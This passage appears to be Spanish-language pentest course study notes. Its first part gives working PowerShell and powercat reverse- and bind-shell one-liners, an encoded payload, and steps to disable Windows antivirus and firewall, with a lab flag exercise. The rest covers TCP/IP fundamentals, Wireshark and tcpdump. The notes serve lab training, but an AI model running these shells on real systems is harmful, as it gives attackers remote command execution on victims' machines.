PS C:\Users\offsec> powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
...
```

Sin embargo, pasar todo el contenido es inviable si sólo tenemos acceso a un entorno de línea de comandos. Es mejor utilizar el siguiente procedimiento, este 

```powershell
powershell -E $(type encodedrevershell.ps1)
```

Este comando utiliza el comando powershell pasándole al comando como segundo argumento el resultado del comando 'type encodedrevshell.ps1' que son los contenidos del fichero 'encodedrevershell.ps1' que contiene el payload encodeado. Recordemos que como primer argumento hemos pasado el -E, que ejecuta un comando encodeado en base64.

<br />

#### 5.8. Practice - PowerShell & PowerCat.

**Use *PowerShell* y *powercat* para crear un reverse shell desde su sistema Windows a su máquina Kali.**

*PowerShell ReverseShell*

En primer lugar, desarrollamos una reverse shell con powershell haciendo uso del script visto anteriormente. Así, desplegamos un listener en la máquina Kali:

```bash
nc -lvp 4444
```

Y empleamos el script en una línea de comandos utilizando la IP y el puerto empleado en el listener anterior:

```powershell
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.142',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Sin embargo, en primera instancia, nuestro código queda bloqueado por el antivirus:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221212214300.png' | relative_url }}" text-align="center"/>
</div>

Por tanto, acudimos a Seguridad de Windows > Configuración de Antivirus y Protección Contra Amenazas y desactivamos todo:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221212204409.png' | relative_url }}" text-align="center"/>
</div>

Y volvemos a lanzar el comando teniendo esta vez sí, exito:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221212204454.png' | relative_url }}" text-align="center"/>
</div>

<br />

*PowerShell BindShell*

Ejecutamos el código que crea un listener en la máquina Windows:

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Al ejecutar el código todo se desarrolla sin saltar errores aparantemente, sin embargo al intentar conectarnos desde nuestra Kali con Netcat, no parece que exista interacción aparentemente:

```bash
nc 192.168.1.144 4444
```

Intentando ahondar más en la causa, vemos que el comando ping no consigue recibir paquetes por lo que algo está interceptando la comunicación ya sea de ida o de vuelta. Como si consieguimos enviar paquetes con ping desde la máquina Windows deducimos que lo que intercepta la comunicación es el Firewall de Windows. Así, desactivamos el Firewall en "Panel de control > Sistema y seguridad > Firewall de Windows Defender > Personalizar configuración":


<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221212220107.png' | relative_url }}" text-align="center"/>
</div>

Y comprobamos que existe comunicación desde la Kali. Volvemos a lanzar el comando y obtenemos acceso:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221212220309.png' | relative_url }}" text-align="center"/>
</div>


*PowerCat ReverseShell*

El siguiente paso es transferir [PowerCat](https://github.com/besimorhino/powercat) desde la máquina Kali a la web. Así, clonamos el repositorio y lo descargamos desde Windows:

```bash
git clone https://github.com/besimorhino/powercat
sudo systemctl start apache2
cp path/to/powercat.ps1 /var/www/html
```

<br />

```cmd
C:\Users\aeoae> powershell -c "Invoke-WebRequest -Uri http://192.168.1.142/powercat.ps1" -OutFile Desktop/powercat.ps1
```

Nada más descargar el fichero salta el antivirus, por lo que de nuevo, hay que asegurarse de tener el antivirus desinstalado antes de transferir el script.

Seguidamente iniciamos una sesión de powershell y ejecutamos el script para hacernos en nuestra sesión de powershell con todas las variables y funciones del mismo:

```powershell
C:\Users\aeoae>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

Prueba la nueva tecnología PowerShell multiplataforma https://aka.ms/pscore6

PS C:\Users\aeoae> cd Desktop
PS C:\Users\aeoae\Desktop> . .\powercat.ps1
PS C:\Users\aeoae\Desktop> powercat
You must select either client mode (-c) or listen mode (-l).
```

Así, una vez instalado, procedemos a activar un listener en la máquina atacante:

```bash
nc -lvp 4444
```

Y utilizamos el siguiente comando en la máquina víctima:

```powershell
powercat -c 192.168.1.142 -p 4444 -e cmd.exe
```

Obteniendo una shell CMD de Windows en nuestra kali.

<br />

*PowerCat BindShell*

Por otra parte, de nuevo, desactivamos el firewall como hicimos anteriormente y activamos un listener en la máquina windows con powercat:

```powershell
powercat -l -p 4444 -e cmd.exe
```

Y realizamos una conexión desde la kali:

```bash
nc 192.168.1.144 4444
```

Obteniendo seguidamente una shell de Windows en nuestra kali.

<br />

*PowerCat Encoded Payload*

Por último vamos a testear los payloads. En primer lugar, introducimos el siguiente comando:

```powershell
powercat -c 192.168.1.142 -p 4444 -e cmd.exe -g > revshell.ps1
```

Esto creará un script que desencadenará una revshell sobre dicha IP y puerto cada vez que sea ejecutado. Antes de ejecutarlo activamos un listener y ejecutamos el script:

```powershell
.\revshell.ps1
```

Observemos que estamos ejecutando scripts y por tanto necesitamos tener recursos para bypasear la política de restricción propia de Windows que impide la ejecución de scripts.

Ahora vamos a probar a encodearlo modificando el comando de la siguiente manera:

```powershell
powercat -c 192.168.1.142 -p 4444 -e cmd.exe -ge > encodedrevshell.ps1
```

Esto guarda el payload a modo de script .ps1 en 'encodedrevshell.ps1'. Ahora vamos a ejecutar el contenido del fichero con el siguiente comando:

```powershell
powershell -E $(type encodedrevshell.ps1)
```

Después de ejecutarlo, obtenemos una reverseshell sobre la kali.

De la misma forma, *desactivamos el Firewall en Windows* y ejecutamos el siguiente comando:

```powershell
powercat -l -p 4444 -e cmd.exe -ge > encodedlist.ps1; powershell -E $(type encodedlist.ps1)
```

Este sigue la misma lógica que el procedimiento anterior, cra un payload que hace que el sistema escuche peticiones en un puerto y lo redirige sobre una cmd, pero encodeado y cuyo contenido se deriva a un fichero. Seguidamente se ejecuta el contenido del script como en el comando anterior.

En la máquina atacante realizamos una conexión con netcat o socat sobre el puerto para realizar la conexión:

```bash
nc 192.168.1.144 4444
```

Así, obtenidríamos la conexión.

Observemos que en todo este proceso hemos hecho uso de scripts y por tanto, hay que tener la restricción de ejecución de scripts desactivada.

<br />

**1er Flag:A pesar de que Kali VM #1 parece una máquina Linux (es una máquina Linux), puede acceder a un indicador de PowerShell ejecutando _./powerflag_ en la carpeta _/challenge_ . Dentro de este directorio, también encontrará una versión modificada de _powercat_ . Use el indicador de PowerShell provisto por _powerflag_ junto con _powercat_ para obtener un shell en su máquina. Una vez que completes esta conexión, recibirás la bandera."**

En primer lugar nos logeamos a la máquina y acudimos a la carpeta /challenge y ejecutamos el binario /powerflag.

Seguidamente importamos el script de powercat y activamos un listener:

```powershell
. .\powercat.ps1
powercat -l -p 4444 -e cmd.exe
```

Y seguidamente desde otra sesión de ssh nos conectamos internamente al puerto 4444:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221213180457.png' | relative_url }}" text-align="center"/>
</div>

Y recibimos la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221213180512.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 6. Networking Fundamentals.

Un pentester debe ser un individuo bien versado en conceptos fundamentales de Networking. 

<br />

#### 6.1. TCP/IP model Layer.

Un modelo de red es una descripción del curso que siguen los paquetes cuando estos viajan a través de dos ordenadores. Uno de los modelos más empleados es el  modelo TCP/IP que se compone de cuatro capas: 

- 4. Capa de aplicación.
- 3. Capa de transporte.
- 2. Capa de internet.
- 1. Capa enlace.

<br />

##### 4.0.3.1.1. Link Layer.

Las redes que consisten únicamente en dispositivos físicos son vulnerables a las *colisiones*. Las colisiones ocurren cuando más de un dispositivo transmite paquetes en un segmento de red al mismo tiempo. El objetivo principal de esta capa es reducir las colisiones en la red física.

Con mucho, la tecnología más destacada y extendida que se usa para conectar dispositivos en la capa de enlace hoy en día se llama *Ethernet* . Ethernet nos permite formar límites lógicos alrededor de dispositivos conectados físicamente a través del concepto de *conmutadores* o *puentes* de red . Los conmutadores esencialmente reducen la cantidad de máquinas que pueden colisionar en una red grande al dividirla en redes de redes más pequeñas. Cualquier dispositivo en la red puede llegar a la interfaz de red de cualquier otro dispositivo invocando su dirección MAC.

Las direcciones MAC se construyen concatenando seis bytes (números hexadecimales de 8 bits), por ejemplo, "11:22:33:44:55:66".

Esto significa que hay 2^48 o más de 281 _billones_ de direcciones MAC posibles. Debido a que hay tantas direcciones MAC potenciales, teóricamente son globalmente únicas. La primera mitad de la dirección MAC se duplica como un *Identificador Único Organizacional (OUI)*, lo que también ayuda a garantizar la unicidad.

Cuando un dispositivo quiere enviar información a otro dispositivo en la red, incluye tanto su propia dirección MAC como la dirección MAC del receptor previsto en cada trama. Aquí es donde entra en juego el *Protocolo de resolución de direcciones* (Address Resolution Protocol) que se encarga de asociar una IP con una MAC.

<br />

**Exercises**

**¿Cuál es la PDU de la capa del modelo TCP/IP en la que opera Ethernet?**

Frame

<br />

**¿Qué address utiliza la capa de enlace de datos**?

Mientras que la capa de internet trabaja con IPs, la capa de enlace de datos trabaja con MACs.

<br />

**¿Qué dispositivos de fragmentación de redes operan a este nivel?**

Switch

<br />

<br />

##### 4.0.3.1.2. Capa de Internet.

La capa de Internet se usa cuando queremos permitir que los dispositivos se conecten a través de redes, es decir, cuando estos dispositivos no se encuentran en la misma red local, esta información ya ha sido adherida en la capa anterior. El Protocolo de Internet (IP) es el que se ocupa para permitir que esto suceda mediante el uso de *direcciones IP*. (Usaremos el término "dirección IP" para referirnos a las direcciones *IPv4* . IPv4 es la cuarta versión de IP y la más utilizada en la actualidad.)

Para construir una dirección IP, tomamos cuatro octetos y los concatenamos para formar un número entero de 32 bits. Para cada uno de los cuatro octetos, se elige un número entre 1 y 255. Estos valores se llaman octetos porque *2^8 = 256*. Un ejemplo de una dirección IP es 192.168.127.16.

Dado que cada octeto es independiente de los demás, este esquema de direccionamiento puede permitirnos crear *2^8^4* o *2^32* direcciones que es un número menor que el número de dispositivos conectados a internet actualmente.

Como hay menos IPs que dispositivos, se emplean subredes que operan bajo una *máscara de subred* usa el mismo formato numérico que una dirección IP, por lo que puede resultar un poco confuso. Al igual que las direcciones IP, también se construyen concatenando cuatro octetos. A diferencia de las direcciones IP, por lo general comienzan con el valor "255" (por ejemplo, 255.255.255.0 o 255.255.0.0).

A cada red se le asigna una máscara de subred, que ayuda a definir qué direcciones IP pueden existir dentro de esa misma red pero no fuera. De esta forma se distinguen entre IPs públicas e IPs privadas.

Comprender los detalles completos de cómo funcionan las máscaras de subred está más allá del alcance de este tema. Proporcionaremos una breve introducción, así como algunos recursos adicionales, para complementar su comprensión.

Primero debemos notar que las direcciones IP que mencionamos anteriormente solo se escriben como octetos por conveniencia y legibilidad. Una dirección IP también se puede representar como un número binario simple de 32 bits. Aquí está la dirección anterior (192.168.127.16) escrita como binario:

```
11000000101010000111111100010000
```

Podemos volver a agregar los puntos entre cada byte para mayor legibilidad:

```
11000000.10101000.01111111.00010000
```

A continuación, nos damos cuenta de que las máscaras de subred se pueden representar en el mismo formato. La máscara de subred 255.255.255.0, por ejemplo, sería:

```
11111111.11111111.11111111.00000000
```

En principio esta máscara de red estaría asociada a una subred cuyos dispositivos tendrían IPs con los tres primeros octetos iguales; 192.168.127.X, es decir, que esta máscara de red tendría los tres primeros octetos fijos de forma que sería una red que tendría cabida para tan sólo 255 dispositivos (observemos que el X.X.X.1 sería la IP privada de la red asociada al router).

<br />

##### 4.0.3.1.3. Capa de Transporte.

Mientras que IP se encarga de enrutar mensajes hacia y desde sistemas a través de diferentes redes a través de direcciones IP, los protocolos de nivel de transporte intentan asegurarse de que los mensajes lleguen a su destino previsto a tiempo y en el orden correcto.

TCP es quizás el protocolo de capa de transporte más común. Permite la comunicación bidireccional mediante el establecimiento de una sesión entre máquinas. Una sesión TCP se inicia mediante lo que se denomina el protocolo de enlace de tres vías. Así es como funciona:

*Paso 1*: la máquina A envía un paquete con un indicador llamado *SYN* (o sincronizar) a la máquina B.

*Paso 2*: la máquina B recibe el indicador SYN y devuelve un paquete con el indicador *SYN-ACK* para reconocer la máquina A.

*Paso 3*: La máquina A recibe el SYN-ACK y finalmente envía un indicador *ACK* para confirmar la máquina B.

Con estos tres pasos, ambas máquinas saben de forma fiable que cada una de ellas está recibiendo los mensajes de la otra. La sesión ahora está abierta y las dos máquinas ahora pueden enviar segmentos de ida y vuelta.

Además de la función de sesiones robustas, TCP agrega el concepto de *puertos*. Mientras que un paquete IP requiere que el remitente especifique una dirección IP, un segmento TCP (que recordemos que por una cuestión de encapsulación ya tiene la información del paquete IP) requiere que el remitente especifique un número de puerto entre 0 y 65535 (2^16 - 1). Los puertos del 0 al 1023 se consideran puertos conocidos y los servicios de red extremadamente populares los utilizan con frecuencia (a saber, TELNET, SSH, etc). Esencialmente, los puertos TCP permiten que una máquina abra múltiples sesiones de comunicación al mismo tiempo.

Algunos servicios de red no requieren la comunicación bidireccional confiable proporcionada por TCP y simplemente necesitan enviar y recibir mensajes unidireccionales. En lugar de pasar por el trabajo de establecer una sesión (esto es, de abrir un canal de comunicación fiable) una máquina que transmite a través de UDP simplemente envía su mensaje y asume que la otra máquina lo ha recibido.

Observemos así que la principal diferencia entre TCP y UDP es la necesidad de asegurarse que la información llega a su destino a costa de la velocidad de transmisión, esto hace a UDP más rápido en contraste con TCP.

<br />

##### 4.0.3.1.4. Capa de Applicación.

Ya hemos cubierto varios protocolos de nivel inferior del modelo TCP/IP. Las siguientes secciones abordan muy brevemente algunos de los protocolos de la capa de aplicación más comunes.

- *HTTP* es el protocolo de la web. Especifica reglas para que los clientes web recuperen contenido de los *servidores web*. HTTP usa más comúnmente el puerto 80. Tradicionalmente, los navegadores web usarían el puerto 80 como el puerto predeterminado si no se especifica en la URL. Sin embargo, recientemente, los desarrolladores de navegador comenzaron a establecer el puerto predeterminado en 443, que a menudo ejecuta un cifrado de HTTP, llamado HTTPS. HTTP utiliza una serie de *requests* generadas por un cliente y *responses* generadas por un servidor para permitir una comunicación flexible y eficiente.

- *FTP* permite que un cliente se conecte, explore, envíe y recupere archivos hacia y desde un servidor. Es útil conocer FTP desde una perspectiva de seguridad, ya que permite descubrir información que puede no estar tan supervisada o reforzada como otros servicios de red. Cuando se usa TCP, FTP generalmente opera en el puerto 21. FTP se considera un protocolo completamente orientado a la sesión, porque una vez que se establece una conexión, el cliente puede continuar interactuando con el servidor hasta que finaliza la sesión. UDP tiene una contraparte de FTP, que se ejecuta en el puerto 69, llamado TFTP. A diferencia de FTP, TFTP simplemente permite la transferencia o recuperación única de archivos. Lo dejaremos como trivia para que el estudiante investigue qué significa la T en TFTP.

- *SMTP* es uno de varios protocolos de capa de aplicación dedicados al correo electrónico. Al igual que con otros protocolos, SMTP describe una conversación o negociación entre dos partes: un remitente y un receptor. Cuando se escribe un correo electrónico, lo primero que sucede después de presionar _enviar_ es que el mensaje se transfiere desde el dispositivo local del remitente a su _servidor de correo_ remoto. Luego, este servidor de correo saliente negocia con el servidor de correo _entrante_ del destinatario . SMTP describe la forma en que los dos servidores de correo deben interactuar para validar el papel del otro en el proceso de comunicación. SMTP rige la comunicación de un remitente a su servidor de correo y de su servidor de correo al del destinatario. En otras palabras, se utiliza sólo para _enviar_ correo electrónico. Otros protocolos describen cómo un destinatario puede recuperar el correo electrónico desde un servidor de correo. SMTP también tiende a ejecutarse en un puerto especial conocido, el puerto 25. SMTP envía mensajes mientras que los protocolos IMAP y POP3 los extrae del mailbox.

<br />

#### 6.2. Data Packets & Analisis I (WireShark). 

##### 4.0.3.2.1. Traffic, Packet Captures and Wireshark.

**Intro**

Cuando los datos se mueven a través de una red, se envían y reciben en unidades llamadas paquetes. Podemos pensar en un paquete como un pequeño contenedor que incluye tanto un mensaje como metainformación sobre el mensaje.

La transferencia de muchos paquetes a través de una red se denomina *tráfico de red*. Fundamentalmente, el tráfico de la red se puede rastrear o capturar a través de las herramientas de *captura de paquetes*.

<br />

**Wireshark**

Varias herramientas diferentes pueden ayudarnos a interceptar y registrar el tráfico de la red. Estos pueden ser útiles tanto para los atacantes como para los defensores. Por ejemplo, un atacante podría usar una herramienta de este tipo para obtener autenticación sin cifrar en un servidor web. Mientras tanto, un defensor podría usar la misma herramienta para detectar la presencia del atacante en la red.

Muchas herramientas de captura de paquetes pueden guardar datos para su uso posterior, a menudo utilizando el formato de archivo .pcap. Esto puede ser muy útil, especialmente porque un pcap generado en un dispositivo puede abrirse y analizarse en otro dispositivo o incluso en un sistema operativo diferente.

Las bibliotecas de software *Libpcap, Winpcap y Npcap* implementan la funcionalidad de captura de paquetes. Estas bibliotecas son las que nos permitirán guardar el tráfico capturado en archivos .pcap. Los archivos que contienen tráfico de red capturado generalmente se denominan simplemente "archivos pcap", sin el punto.

Wireshark es una aplicación que se puede utilizar para capturar el tráfico de red. Por lo general, se usa a través de una GUI optimizada, pero también tiene una versión CLI llamada tshark. 

Wireshark se puede usar para escuchar u *snifar* el tráfico de la red en vivo, y también se puede usar para analizar un archivo pcap generado previamente.

Para iniciar Wireshark a través de la GUI de Kali podemos abrir una terminal y teclear WireShark.

```bash
sudo wireshark
```

<br />

**Filtros de captura**

Wireshark, además de desplegar, información que extrae de los paquetes de red que captura, también permite la inserción de filtros que permite desplegar tan sólo aquellos paquetes que coincidan coon undeterminado patrón.

Por ejemplo, si sólo queremos ver aquellos paquetes que vayan dirigidos a un determinado host podemos utilizar el filtro:

```bash
host <IP>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221223160134.png' | relative_url }}" text-align="center"/>
</div>

Wireshark contiene una lista de filtros accesible mediante 'Alt+C' > Capture Filters:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221223160706.png' | relative_url }}" text-align="center"/>
</div>

A la izquierda vemos lo que pretendemos haer y a la derecha la secuencia a introducir para lograr nuestro propósito.

<br />

**Interfaces de red**

Una interfaz de red o simplemente interfaz es un dispositivo, ya sea físico o virtual, que permite que dos máquinas se pongan en contacto entre ellas. 

- *Eth0* representa la tarjeta de red físicamente instalada en un ordenador que permite al mismo ponerse en contacto con otros dispositivos dentro de la red local.

- Tun0 o Tap0 son interfaces de red que ofrecen comunicación a través de una VPN. 

<br />

**Exercises**

**Vuelva a abrir Wireshark en su máquina Kali y configure un filtro de captura para el host http.kali.org. Luego, navegue a http.kali.org usando Firefox. ¿Qué dirección IP pertenece a http.kali.org?**

En primer lugar, utilizamos el filtro *http* para capturar paquetes http y seguidamente acudimos con el buscador Firefox a http.kali.org y volvemos sobre Wirshark, inspeccionando las request HTTP obtendremos que la IP es 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221223172611.png' | relative_url }}" text-align="center"/>
</div>

<br />

**¿En qué protocolo se comunica el primer paquete de la captura?**

Ahora, lo que pretendemos desde Wireshark es desplegar toda la comunicación entre nuestra máquina y dicha IP, para ello empleamos el filtro:

```wireshark
ip.addr == 192.99.200.113
```

Obteniendo que el primer paquete tiene el protocolo TCP.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221223172908.png' | relative_url }}" text-align="center"/>
</div>

<br />

**¿Cuántos paquetes se transmiten antes del primer paquete HTTP?**

Atendiendo a la imágen anterior podemos observar que se mandan 3, esto concuerda con el saludo de inicio de sesión del protocolo tcp 3-Way-Handshake en el que se mandan un SYN, se devuelve un SYN-ACK y se termina por mandar un ACK.

<br />

##### 4.0.3.2.2. Using Wireshark: Display Filters.

Ahora que tenemos a Wireshark escuchando el tráfico que viaja hacia o desde http.kali.org, filtremos los paquetes que podemos monitorear en la interfaz de usuario con *Display Filters* (filtros de visualización). A diferencia de un filtro de captura, un filtro de visualización no afecta los datos que intercepta Wireshark. En su lugar, simplemente aplica una máscara temporal en los paquetes que no se ajustan a los criterios definidos. También podemos elegir un filtro de una lista predefinida yendo al menú Analyze (o usando Alt + A ), y luego seleccionando Display Filters...

En el campo *Display Filter*, escribimos *http* y presionemos 'Return' para aplicar un filtro de visualización que solo muestre los paquetes _del Protocolo de transferencia de hipertexto_ (HTTP). 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227115915.png' | relative_url }}" text-align="center"/>
</div>

En la imagen de arriba, hemos seleccionado el paquete que contiene el texto visible en el navegador Firefox. 

La pantalla gráfica de Wireshark tiene tres secciones principales:

- La sección superior nos permite seleccionar qué paquete queremos analizar. El paquete que elijamos cambiará el contexto de las secciones central e inferior.

- La sección intermedia nos permite analizar un paquete específico en varios niveles, según el protocolo que nos interese. Más adelante trataremos este concepto de _capas de protocolo_ con más detalle.

- Finalmente, la sección inferior nos permite inspeccionar el contenido sin procesar del paquete seleccionado en formato hexadecimal, junto con una traducción a ASCII (donde esté disponible).

Cuando hayamos terminado con nuestra captura, podemos guardarla en un archivo. La capacidad de guardar y cargar pcaps nos da bastante versatilidad. Por ejemplo, es posible que queramos guardar algo de tráfico durante un compromiso de seguridad inalámbrica para poder analizar el tráfico de nuestra oficina más tarde. Para guardar una captura de paquete, vaya a Archivo > Guardar (o presione Ctrl + S).

<br />

**Exercises**

**Busque a través de los paquetes generados por la solicitud a http.kali.org. Hay un archivo que devuelve un mensaje 404. ¿Cuál es esa URI?**

Activamos a Wireshark y filtramos la interfaz 'eth0' por el protocolo HTTP. Seguidamente desde Firefox acudimos a 'http.kali.org' y revisamos el tráfico capturado:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227122135.png' | relative_url }}" text-align="center"/>
</div>

Observamos un paquete de respuesta que tiene por número 404 (Not found) a la izquierda, las flechas del campo 'No.' sugieren que está relacionado con la request 'GET /favicon.ico'. Por tanto a URI es http.kali.org/favicon.ico.

<br />

**Cierre la captura de _http.kali.org_ y realice otra captura mientras navega a www.offensive-security.com. Intente establecer un filtro de visualización para http. ¿Qué tecnología de seguridad evita que Wireshark capture o muestre datos http? Este ejercicio puede requerir alguna investigación externa.**

Una forma sencilla de evitar el filtrado de paquetes es cifrarlos con TLS.

<br />

##### 4.0.3.2.3. Opening PCAP files.

Descargamos el fichero y lo abrimos con Wireshark.

- En la parte inferior derecha podemos encontrar que el número de paquetes capturados en el fichero son 32488.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227132053.png' | relative_url }}" text-align="center"/>
</div>

- Podemos invocar el filtro 'ip.addr\=\=172.16.40.10' para ver el tráfico que involucra dicha IP obteniendo que la IP se relaciona con 208.68.234.99.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227132437.png' | relative_url }}" text-align="center"/>
</div>

- En Statistics > Capture File Properties podemos ver las propiedades del fichero, entre ellas, propiedades medias de los paquetes capturados:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227133134.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 6.3. Data Packets & Analisis II (WireShark & TCPDump).

##### 6.3.1. Following TCP streams & Exporting objects in Wireshark.

En esta unidad de aprendizaje, continuaremos aprendiendo sobre funciones más avanzadas en Wireshark y comenzaremos a explorar *Tcpdump*.

Hasta ahora, hemos estado usando Wireshark para ver el tráfico de red secuencialmente en el orden en que los paquetes viajaron a lo largo del tiempo. Sin embargo, a menudo nos interesan más los *flujos* de datos entre varios clientes y servidores. Al seleccionar un flujo de datos, Wireshark debe aplicar un tipo específico de filtro de visualización que nos permite ver la conversación entre un cliente y un servidor. Wireshark tiene una poderosa capacidad para volver a ensamblar una sesión específica y mostrarla en varios formatos.

En Wireshark, abra el archivo de captura flow_and_export.pcap . Primero, hagamos clic en los paquetes secuencialmente y determinemos si podemos averiguar qué sucedió en esta sesión. A menos que ya esté familiarizado con la lectura de paquetes, puede pasar algún tiempo antes de que sea evidente. Esta es una situación en la que usar un flujo de datos será muy útil. Una vez que se vuelve a ensamblar un flujo de datos, es mucho más fácil leer el historial de la sesión.

Primero, haga clic con el botón derecho en el primer paquete de la captura y seleccione *Follow* > *TCP Stream*. Se abrirá una nueva ventana, donde podemos observar que un usuario parece haber iniciado sesión correctamente en algún servicio.

En el lado derecho, justo encima del botón *Find Next* , podemos seleccionar otros flujos de datos capturados en el pcap actual. Al leer rápidamente cada uno de los flujos, podemos obtener una buena descripción general de alto nivel de la actividad de la red que generó nuestro pcap.

Wireshark puede exporta datos que se encuentran dentro de una captura de paquetes. Esta es una forma elegante de decir que guardamos y revisamos varios tipos de datos que pueden ayudarnos en una prueba de penetración o para defender nuestra red.

Por ejemplo, si solo estamos interesados ​​en unos pocos paquetes específicos en nuestra captura, podemos usar el menú *Archivo* > *Exportar paquetes específicos...* para guardar un nuevo archivo pcap más pequeño.

Wireshark tiene una amplia gama de tipos de datos que se pueden exportar. Una de las opciones más interesantes desde el punto de vista de la seguridad es la capacidad de exportar *objetos*. Al exportar un objeto, podemos recrear y guardar cualquier archivo de interés que haya sido transferido durante la grabación del pcap. Dentro del menú *File* > *Export Objets*, encontramos que Wireshark admite la exportación de objetos para varios protocolos de capa de aplicación. Al hacer clic en un protocolo, Wireshark escaneará y mostrará todos los objetos identificados en los flujos de datos de ese protocolo. Luego podemos guardar los objetos que nos gustaría evaluar más a fondo en nuestro disco local.

<br />

**Exercises**

**1.  Seleccione el menú _Exportar objetos_ y determine a qué protocolos de aplicación se ha hecho referencia en el pcap. ¿Puede encontrar el archivo de imagen alojado por la máquina en 10.10.10.2? ¿Cuál es la extensión del archivo?**

Acudimos a File > Export Objects > HTTP y observamos que la extensión del archivo es jpeg:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227174934.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2.  ¿Cuántos flujos de datos TCP se pueden reconstruir a partir del pcap? (proporcionar el número solamente)**

Pulsamos Botón derecho > Follow > TCP Stream sobre un paquete y en la parte inferior subimos hasta que no podamos más. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227180142.png' | relative_url }}" text-align="center"/>
</div>

El número de streams es el máximo número que podamos subir +1.

<br />

**3.  ¿Qué sitio web relacionado con la seguridad de la información se visitó en esta sesión?**

Filtramos el contenido de los paquetes por el protocolo HTTP y revisando la parte de uno de los paquetes por la sección HTTP encontramos que el host es 'www.offensive-security.com'.

<br />

**4.  ¿Qué es el User-Agent en las solicitudes HTTP GET?**

Sobre un paquete que lleve una solicitud GET, inspeccionamos las cabeceras y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227181152.png' | relative_url }}" text-align="center"/>
</div>

<br />

**5. ¿Qué nombre de usuario se utilizó para iniciar sesión en el servicio FTP el 10.10.10.2?**

Revisando el campo 'info' de todos los paquetes interceptados podemos ver uno con el nombre del usuario.

<br />

**6. ¿Cuál es la bandera contenida en flag.jpg?**

Aplicamos el filtro HTTP y seleccionamos el paquet que contiene el 'GET /flag.jpg' request y localizamos la respuesta al GET que contendrá dicha imagen indicado con una flecha:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227190225.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, sobre la respuesta que contiene la imagen, inspeccionamos el contenido del paquete y sobre el campo 'File Data' pulsamos el botón derecho y seleccionamos Export Packet Bytes:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227191416.png' | relative_url }}" text-align="center"/>
</div>

Guardamos el contenido en un fichero y seguidamente lo abrimos con el comando:

```bash
open flag.jpg
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221227191509.png' | relative_url }}" text-align="center"/>
</div>

<br />

##### 6.3.2. TCPDump.

*Tcpdump* es un *cli* que tiene como función interceptar y mostrar tráfico de red. Es por mucho la herramienta de línea de comandos de inspección de tráfico de red más utilizada disponible.

```bash
kali@kali:~$ sudo tcpdump
